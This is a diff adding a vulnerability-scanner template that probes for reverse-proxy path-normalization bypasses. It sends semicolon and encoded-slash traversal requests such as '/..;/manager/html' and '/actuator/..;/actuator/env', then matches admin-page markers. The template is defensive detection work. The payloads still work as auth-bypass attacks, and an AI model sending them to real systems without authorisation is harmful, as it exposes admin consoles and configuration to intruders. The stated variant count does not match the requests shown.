@@ -1,0 +1,100 @@
+# gap: path-normalization-auth-bypass-semicolon-encoded
+id: path-normalization-auth-bypass-semicolon-encoded
+
+info:
+  name: Path Normalization Reverse-Proxy ACL Bypass (semicolon / encoded-slash)
+  author: TyrusRC
+  severity: high
+  description: |
+    Detects the classic reverse-proxy path-normalization bypass
+    bug class: the front-tier (nginx, AWS ALB, Cloudflare, Akamai,
+    Apache as proxy) applies its ACL against the literal request
+    path, while the backend (Tomcat, Spring, Jetty, Node, Python
+    frameworks) normalizes `..;/`, `..%2f`, `%2e%2e/`, or
+    semicolon-segment variants and serves the protected resource.
+
+    The probe sends a 2-step raw block per candidate admin path:
+    (1) the literal path expected to be ACL-blocked, (2) one of
+    seven normalized variants. The matcher fires only when the
+    baseline returns 401/403/404/302 AND the variant returns 200
+    with an admin-marker (`Tomcat Web Application Manager`,
+    `Spring Boot Actuator`, `<title>...Admin`, `actuator/health`,
+    `manager-script`). The status-differential plus admin-marker
+    requirement keeps the FP rate near-zero compared to
+    fuzz-and-grep variants.
+
+    Class detection — replays on every reverse-proxy / backend
+    pair where the two stacks disagree on path semantics,
+    regardless of vendor.
+  reference:
+    - https://joshua.hu/proxy-pass-nginx-decoding-normalizing-url-path-dangerous
+    - https://rioasmara.com/2022/03/21/nginx-and-tomcat-mutual-auth-bypass/
+    - https://www.acunetix.com/blog/web-security-zone/path-normalization-vulnerabilities/
+  tags: custom,vulnerabilities,auth-bypass,proxy,path-traversal,owasp,cwe-22,cwe-287
+
+http:
+  - raw:
+      # Request 1: baseline /admin probe (expect block)
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # Request 2: semicolon-segment normalization variant
+      - |
+        GET /admin/..;/admin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # Request 3: encoded-slash normalization
+      - |
+        GET /admin/..%2fadmin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # Request 4: double-encoded slash
+      - |
+        GET /admin/%2e%2e/admin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # Request 5: actuator/manager bypass attempt
+      - |
+        GET /actuator/..;/actuator/env HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # Request 6: Tomcat manager bypass attempt
+      - |
+        GET /..;/manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      # Baseline must be blocked or non-existent.
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 401 || status_code_1 == 403 || status_code_1 == 404 || status_code_1 == 302'
+      # At least one normalized variant must return 200.
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200 || status_code_3 == 200 || status_code_4 == 200 || status_code_5 == 200 || status_code_6 == 200'
+      # AND the 200 response must carry an admin-surface marker
+      # (kept in any response body to allow OR across the variants).
+      - type: regex
+        part: body
+        regex:
+          - '(?i)(Tomcat Web Application Manager|Spring Boot Actuator|manager-script|<title>[^<]{0,60}(Admin|Manager|Dashboard)|"_links"\s*:\s*\{[^}]{0,200}"env"|"activeProfiles")'
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"baseline=" + status_code_1 + " variants=" + status_code_2 + "/" + status_code_3 + "/" + status_code_4 + "/" + status_code_5 + "/" + status_code_6'
+      - type: regex
+        part: body
+        name: admin-surface
+        regex:
+          - '(?i)(Tomcat Web Application Manager|Spring Boot Actuator|<title>[^<]{0,80})'
+        group: 1
